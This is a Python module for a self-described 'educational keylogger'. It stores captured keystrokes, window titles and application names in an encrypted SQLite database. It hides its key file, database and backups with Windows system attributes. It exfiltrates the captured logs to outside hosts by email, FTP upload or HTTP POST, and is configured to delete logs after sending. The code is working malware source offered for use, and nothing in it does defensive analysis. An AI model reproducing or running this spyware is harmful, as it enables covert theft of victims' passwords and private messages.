#!/usr/bin/env python3
"""
Log Management and Encryption Module for Educational Keylogger

This module handles secure log file management, encryption, and remote transmission
for educational and testing purposes.
"""

import os
import json
import base64
import gzip
import time
import smtplib
import ftplib
import requests
import io
from datetime import datetime, timedelta
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import threading
import sqlite3
import hashlib


class LogManager:
    def __init__(self, config=None):
        self.config = config or self.load_default_config()
        self.encryption_key = self.load_or_generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.db_connection = self.init_database()
        
    def load_default_config(self):
        """Load default configuration"""
        return {
            "encryption": {
                "enabled": True,
                "password": "default_password_change_me",
                "key_file": ".encryption.key"
            },
            "storage": {
                "max_log_size_mb": 10,
                "compress_logs": True,
                "auto_cleanup_days": 30,
                "backup_enabled": True
            },
            "transmission": {
                "method": "email",  # email, ftp, http, dropbox
                "interval_hours": 24,
                "delete_after_send": True,
                "retry_attempts": 3
            }
        }
    
    def load_or_generate_key(self):
        """Load existing encryption key or generate new one"""
        key_file = self.config['encryption']['key_file']
        
        if os.path.exists(key_file):
            try:
                with open(key_file, 'rb') as f:
                    data = f.read()
                    if len(data) > 32:
                        # File contains salt + key, extract just the key
                        salt = data[:16]
                        key = data[16:]
                        return key
                    else:
                        # File contains just the key
                        return data
            except Exception as e:
                print(f"Error loading key: {e}")
        
        # Generate new key from password
        password = self.config['encryption']['password'].encode()
        salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        
        key = base64.urlsafe_b64encode(kdf.derive(password))
        
        # Save key and salt
        try:
            with open(key_file, 'wb') as f:
                f.write(salt + key)
            
            # Hide key file
            self.hide_file(key_file)
            
            return key
        except Exception as e:
            print(f"Error saving key: {e}")
            return Fernet.generate_key()
    
    def hide_file(self, filename):
        """Hide file from normal view"""
        try:
            import platform
            if platform.system() == "Windows":
                import subprocess
                subprocess.run(['attrib', '+H', '+S', filename], check=True)
            elif platform.system() == "Linux":
                # File is already hidden with . prefix
                pass
        except Exception:
            pass
    
    def init_database(self):
        """Initialize SQLite database for log management"""
        try:
            db_file = ".keylog.db"
            conn = sqlite3.connect(db_file, check_same_thread=False)
            
            # Create tables
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS keystroke_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp DATETIME,
                    keystroke TEXT,
                    window_title TEXT,
                    application TEXT,
                    encrypted_data TEXT,
                    checksum TEXT
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS transmission_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp DATETIME,
                    method TEXT,
                    status TEXT,
                    file_size INTEGER,
                    checksum TEXT,
                    error_message TEXT
                )
            ''')
            
            conn.commit()
            self.hide_file(db_file)
            
            return conn
        except Exception as e:
            print(f"Error initializing database: {e}")
            return None
    
    def encrypt_data(self, data):
        """Encrypt data using Fernet encryption"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            encrypted = self.cipher_suite.encrypt(data)
            return base64.b64encode(encrypted).decode('utf-8')
        except Exception as e:
            print(f"Encryption error: {e}")
            return None
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using Fernet encryption"""
        try:
            if isinstance(encrypted_data, str):
                encrypted_data = base64.b64decode(encrypted_data.encode('utf-8'))
            
            decrypted = self.cipher_suite.decrypt(encrypted_data)
            return decrypted.decode('utf-8')
        except Exception as e:
            print(f"Decryption error: {e}")
            return None
    
    def compress_data(self, data):
        """Compress data using gzip"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            compressed = gzip.compress(data)
            return base64.b64encode(compressed).decode('utf-8')
        except Exception as e:
            print(f"Compression error: {e}")
            return None
    
    def decompress_data(self, compressed_data):
        """Decompress gzip data"""
        try:
            if isinstance(compressed_data, str):
                compressed_data = base64.b64decode(compressed_data.encode('utf-8'))
            
            decompressed = gzip.decompress(compressed_data)
            return decompressed.decode('utf-8')
        except Exception as e:
            print(f"Decompression error: {e}")
            return None
    
    def calculate_checksum(self, data):
        """Calculate SHA-256 checksum of data"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        return hashlib.sha256(data).hexdigest()
    
    def log_keystroke(self, keystroke, window_title="", application=""):
        """Log a keystroke to the database"""
        try:
            if not self.db_connection:
                return False
            
            timestamp = datetime.now()
            
            # Prepare data for storage
            log_entry = {
                "timestamp": timestamp.isoformat(),
                "keystroke": keystroke,
                "window_title": window_title,
                "application": application
            }
            
            # Convert to JSON and encrypt
            json_data = json.dumps(log_entry)
            encrypted_data = self.encrypt_data(json_data)
            
            if self.config['storage']['compress_logs']:
                encrypted_data = self.compress_data(encrypted_data)
            
            checksum = self.calculate_checksum(json_data)
            
            # Insert into database
            cursor = self.db_connection.cursor()
            cursor.execute('''
                INSERT INTO keystroke_logs 
                (timestamp, keystroke, window_title, application, encrypted_data, checksum)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (timestamp, keystroke, window_title, application, encrypted_data, checksum))
            
            self.db_connection.commit()
            
            # Check if log file is getting too large
            self.check_log_size()
            
            return True
            
        except Exception as e:
            print(f"Error logging keystroke: {e}")
            return False
    
    def check_log_size(self):
        """Check and manage log file size"""
        try:
            if not self.db_connection:
                return
            
            cursor = self.db_connection.cursor()
            cursor.execute("SELECT COUNT(*) FROM keystroke_logs")
            log_count = cursor.fetchone()[0]
            
            # Estimate size (rough calculation)
            max_entries = self.config['storage']['max_log_size_mb'] * 1024 * 10  # Rough estimate
            
            if log_count > max_entries:
                # Delete oldest entries (keep last 80%)
                keep_count = int(max_entries * 0.8)
                cursor.execute('''
                    DELETE FROM keystroke_logs 
                    WHERE id NOT IN (
                        SELECT id FROM keystroke_logs 
                        ORDER BY timestamp DESC 
                        LIMIT ?
                    )
                ''', (keep_count,))
                
                self.db_connection.commit()
                print(f"Log cleanup: Removed {log_count - keep_count} old entries")
        
        except Exception as e:
            print(f"Error checking log size: {e}")
    
    def export_logs(self, start_date=None, end_date=None, format="json"):
        """Export logs to various formats"""
        try:
            if not self.db_connection:
                return None
            
            cursor = self.db_connection.cursor()
            
            # Build query
            query = "SELECT * FROM keystroke_logs"
            params = []
            
            if start_date or end_date:
                query += " WHERE "
                conditions = []
                
                if start_date:
                    conditions.append("timestamp >= ?")
                    params.append(start_date)
                
                if end_date:
                    conditions.append("timestamp <= ?")
                    params.append(end_date)
                
                query += " AND ".join(conditions)
            
            query += " ORDER BY timestamp"
            
            cursor.execute(query, params)
            rows = cursor.fetchall()
            
            if format == "json":
                return self.export_to_json(rows)
            elif format == "csv":
                return self.export_to_csv(rows)
            elif format == "html":
                return self.export_to_html(rows)
            else:
                return str(rows)
                
        except Exception as e:
            print(f"Error exporting logs: {e}")
            return None
    
    def export_to_json(self, rows):
        """Export logs to JSON format"""
        logs = []
        for row in rows:
            log_entry = {
                "id": row[0],
                "timestamp": row[1],
                "keystroke": row[2],
                "window_title": row[3],
                "application": row[4],
                "checksum": row[6]
            }
            logs.append(log_entry)
        
        return json.dumps(logs, indent=2, default=str)
    
    def export_to_csv(self, rows):
        """Export logs to CSV format"""
        import csv
        import io
        
        output = io.StringIO()
        writer = csv.writer(output)
        
        # Header
        writer.writerow(['ID', 'Timestamp', 'Keystroke', 'Window Title', 'Application', 'Checksum'])
        
        # Data
        for row in rows:
            writer.writerow([row[0], row[1], row[2], row[3], row[4], row[6]])
        
        return output.getvalue()
    
    def export_to_html(self, rows):
        """Export logs to HTML format"""
        html = """
        <html>
        <head>
            <title>Keylogger Report</title>
            <style>
                table { border-collapse: collapse; width: 100%; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background-color: #f2f2f2; }
            </style>
        </head>
        <body>
            <h1>Keylogger Report</h1>
            <p>Generated: {}</p>
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>Keystroke</th>
                    <th>Window Title</th>
                    <th>Application</th>
                </tr>
        """.format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        
        for row in rows:
            html += f"""
                <tr>
                    <td>{row[1]}</td>
                    <td>{row[2]}</td>
                    <td>{row[3]}</td>
                    <td>{row[4]}</td>
                </tr>
            """
        
        html += """
            </table>
        </body>
        </html>
        """
        
        return html
    
    def send_logs_via_email(self, recipient_config):
        """Send logs via email"""
        try:
            # Export logs
            logs_data = self.export_logs(format="html")
            if not logs_data:
                return False
            
            # Create email
            msg = MIMEMultipart()
            msg['From'] = recipient_config['sender_email']
            msg['To'] = recipient_config['recipient_email']
            msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Email body
            body = f"""
Educational Keylogger Report
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

This report contains captured keystrokes for educational analysis.
Please handle this data responsibly.

Report Details:
- Format: HTML
- Encryption: AES-256 (Fernet)
- Compression: Enabled
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Attach HTML report
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(logs_data.encode())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename="keylogger_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.html"'
            )
            msg.attach(part)
            
            # Send email
            server = smtplib.SMTP(recipient_config['smtp_server'], recipient_config['smtp_port'])
            server.starttls()
            server.login(recipient_config['sender_email'], recipient_config['sender_password'])
            
            text = msg.as_string()
            server.sendmail(recipient_config['sender_email'], recipient_config['recipient_email'], text)
            server.quit()
            
            # Log transmission
            self.log_transmission("email", "success", len(logs_data))
            
            return True
            
        except Exception as e:
            self.log_transmission("email", "failed", 0, str(e))
            print(f"Error sending email: {e}")
            return False
    
    def send_logs_via_ftp(self, ftp_config):
        """Send logs via FTP"""
        try:
            # Export logs to file
            logs_data = self.export_logs(format="json")
            if not logs_data:
                return False
            
            filename = f"keylogger_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            # Connect to FTP
            ftp = ftplib.FTP(ftp_config['server'])
            ftp.login(ftp_config['username'], ftp_config['password'])
            
            # Upload file
            ftp.storbinary(f'STOR {filename}', io.BytesIO(logs_data.encode()))
            ftp.quit()
            
            # Log transmission
            self.log_transmission("ftp", "success", len(logs_data))
            
            return True
            
        except Exception as e:
            self.log_transmission("ftp", "failed", 0, str(e))
            print(f"Error sending via FTP: {e}")
            return False
    
    def send_logs_via_http(self, http_config):
        """Send logs via HTTP POST"""
        try:
            # Export logs
            logs_data = self.export_logs(format="json")
            if not logs_data:
                return False
            
            # Prepare data
            data = {
                'timestamp': datetime.now().isoformat(),
                'data': logs_data,
                'checksum': self.calculate_checksum(logs_data)
            }
            
            # Send POST request
            response = requests.post(
                http_config['url'],
                json=data,
                headers=http_config.get('headers', {}),
                timeout=30
            )
            
            if response.status_code == 200:
                self.log_transmission("http", "success", len(logs_data))
                return True
            else:
                self.log_transmission("http", "failed", len(logs_data), f"HTTP {response.status_code}")
                return False
                
        except Exception as e:
            self.log_transmission("http", "failed", 0, str(e))
            print(f"Error sending via HTTP: {e}")
            return False
    
    def log_transmission(self, method, status, file_size, error_message=""):
        """Log transmission attempts"""
        try:
            if not self.db_connection:
                return
            
            cursor = self.db_connection.cursor()
            cursor.execute('''
                INSERT INTO transmission_log 
                (timestamp, method, status, file_size, error_message)
                VALUES (?, ?, ?, ?, ?)
            ''', (datetime.now(), method, status, file_size, error_message))
            
            self.db_connection.commit()
            
        except Exception as e:
            print(f"Error logging transmission: {e}")
    
    def cleanup_old_logs(self):
        """Clean up old logs based on configuration"""
        try:
            if not self.db_connection:
                return
            
            cleanup_date = datetime.now() - timedelta(days=self.config['storage']['auto_cleanup_days'])
            
            cursor = self.db_connection.cursor()
            cursor.execute('''
                DELETE FROM keystroke_logs 
                WHERE timestamp < ?
            ''', (cleanup_date,))
            
            deleted_count = cursor.rowcount
            self.db_connection.commit()
            
            if deleted_count > 0:
                print(f"Cleaned up {deleted_count} old log entries")
                
        except Exception as e:
            print(f"Error during cleanup: {e}")
    
    def backup_database(self):
        """Create backup of database"""
        try:
            if not self.db_connection:
                return False
            
            backup_filename = f"keylog_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
            
            # Create backup
            backup_conn = sqlite3.connect(backup_filename)
            self.db_connection.backup(backup_conn)
            backup_conn.close()
            
            # Encrypt backup
            with open(backup_filename, 'rb') as f:
                backup_data = f.read()
            
            encrypted_backup = self.encrypt_data(backup_data)
            
            with open(backup_filename + '.enc', 'w') as f:
                f.write(encrypted_backup)
            
            # Remove unencrypted backup
            os.remove(backup_filename)
            
            # Hide encrypted backup
            self.hide_file(backup_filename + '.enc')
            
            print(f"Database backup created: {backup_filename}.enc")
            return True
            
        except Exception as e:
            print(f"Error creating backup: {e}")
            return False
    
    def get_statistics(self):
        """Get logging statistics"""
        try:
            if not self.db_connection:
                return {}
            
            cursor = self.db_connection.cursor()
            
            # Total logs
            cursor.execute("SELECT COUNT(*) FROM keystroke_logs")
            total_logs = cursor.fetchone()[0]
            
            # Logs today
            today = datetime.now().date()
            cursor.execute("SELECT COUNT(*) FROM keystroke_logs WHERE DATE(timestamp) = ?", (today,))
            today_logs = cursor.fetchone()[0]
            
            # Transmission stats
            cursor.execute("SELECT method, status, COUNT(*) FROM transmission_log GROUP BY method, status")
            transmission_stats = cursor.fetchall()
            
            # Date range
            cursor.execute("SELECT MIN(timestamp), MAX(timestamp) FROM keystroke_logs")
            date_range = cursor.fetchone()
            
            return {
                "total_logs": total_logs,
                "today_logs": today_logs,
                "transmission_stats": transmission_stats,
                "date_range": date_range,
                "database_size": os.path.getsize('.keylog.db') if os.path.exists('.keylog.db') else 0
            }
            
        except Exception as e:
            print(f"Error getting statistics: {e}")
            return {}


# Example usage and testing
if __name__ == "__main__":
    # Initialize log manager
    log_manager = LogManager()
    
    # Test logging
    log_manager.log_keystroke("Hello World", "Test Window", "Test App")
    
    # Get statistics
    stats = log_manager.get_statistics()
    print(f"Statistics: {stats}")
    
    # Export logs
    logs = log_manager.export_logs(format="json")
    print(f"Exported logs length: {len(logs) if logs else 0}")